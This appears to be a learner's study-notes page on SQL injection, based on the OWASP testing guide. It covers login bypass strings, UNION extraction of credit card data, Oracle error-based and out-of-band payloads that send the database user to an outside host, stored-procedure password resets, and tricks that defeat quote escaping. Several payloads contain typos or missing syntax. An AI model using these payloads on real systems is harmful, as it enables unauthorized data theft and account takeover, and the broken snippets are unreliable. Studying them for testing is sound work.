# SQL Injection

## Standard Exploitation

* Write `‘or ‘1’ = ‘1`

```sql
# Transform this request : 
SELECT * FROM Users WHERE Username=’$username’ AND Password=’$password’

# To that : 
SELECT * FROM Users WHERE Username=’admin’ AND Password=’1’ OR ‘1’ = ‘1’
```

* You can also use comment instead of closing the string :
  * `or 1=1 --`  \(be mindful of the last space\)
  * `or 1=1#`
* Use `LIMIT` if needed
* Stack request by terminating it with `;`
  * For example : `http://www.example.com/product.php?id=10; INSERT INTO users (…)` 
  * Not possible with every DB
  * Not possible with a prepare function

## Union Exploitation

* Extend a `SELECT` request with an `UNION`

```sql
# Tansform this request :
SELECT Name, Phone, Address FROM Users WHERE Id=$id

# To that :
SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

* `ALL` is used against `DISTINCT`
* I added `1, 1` because we need to have the same number of columns that the initial `SELECT` 
  * To determine the correct number, use :`http://www.example.com/product.php?id=10 ORDER BY 10--` 
  * If it returns something, there's 10 columns
  * If it's an error, there either more or less columns
* In this exemple they're int \(so `1, 1`\), but the placeholder also needs to match the column type
  * Start by using NULL and then change the type and check the error
* If only the first result is shown \(aka, the one from the initial request\), give an invalid id so that it's the result of the union which will be use

## Error Based Exploitation

* With oracle, use this type of payload :

```sql
|| UTL_INADDR. GET_HOST_NAME((SELECT user FROM DUAL)) --
```

* It'll return : `ORA-292257: host SCOTT unknown`, revealing the user

{% hint style="info" %}
Check the syntax for other DBMS
{% endhint %}

## Out of band exploitation

* With Oracle

```sql
|| UTL_HTTP. request(‘testerserver.com:80’ || (SELET user FROM DUAL) --
```

{% hint style="info" %}
* Isn't a `)` missing ?
* Check the syntax for other DBMS
{% endhint %}

## Stored Procedure Injection

* This type of syntax exist

```sql
Create procedure get_report @columnamelist varchar(7900) As Declare @sqlstring varchar(8000) Set @sqlstring = ‘ Select ‘ + @ columnamelist + ‘ from ReportTable‘ exec(@sqlstring) Go
```

* Which we can abuse with  :`1 from users; update users set password = ‘password’; select *`
* But i don't know this syntax so i don't know how it works

## Insider Info

If you have an injection in a place where doing an `or 1=1` isn't useful, you may still be able to use it to show the table name & structure by injecting an sql command.

## MySQL Server Specificity

{% hint style="info" %}
There's the same thing for PL/SQL Server, Microsoft SQL Server, PostGre SQL, Miscrosoft Access & NoSQL, but i don't know them so i didn't detailed it
{% endhint %}

* Useful functionnalities for injections by version :
  * From Version 4.0: UNION 
  * From Version 4.1: Subqueries 
  * From Version 5.0: Stored procedures, Stored functions and the view named INFORMATION\_SCHEMA 
  * From Version 5.0.2: Triggers

### Single Quote Escape

* MySQl can escape `'` which prevent some attacks
* You can bypass like this : `password LIKE 'A%'` to
  * `password LIKE 0x4125`
  * `password LIKE CHAR(65,37)`
* If the db use the GBK charset \(simplified chinese\) and not the application, using `\xBF'` \(URL-encoded as `%bf%27`\) will prevent `addslashes` \(php function\) from correctly escaping the quote
  * Explained [here](http://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string)

## Sources

* [Owasp testing guide v4](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf)
* Misc research

